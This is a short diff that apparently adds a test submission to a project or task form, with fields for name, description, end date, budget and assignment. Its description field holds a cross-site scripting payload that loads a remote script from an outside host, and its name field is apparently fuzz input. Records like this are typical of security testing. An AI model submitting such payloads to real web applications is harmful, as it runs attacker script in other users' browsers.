@@ -1,0 +1,6 @@
+name : 5Q:3.x1 0 5'x.
+desc : <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+end : 19.7.2016
+budget : 263,166
+assignto[] : 1
+assignme : 1
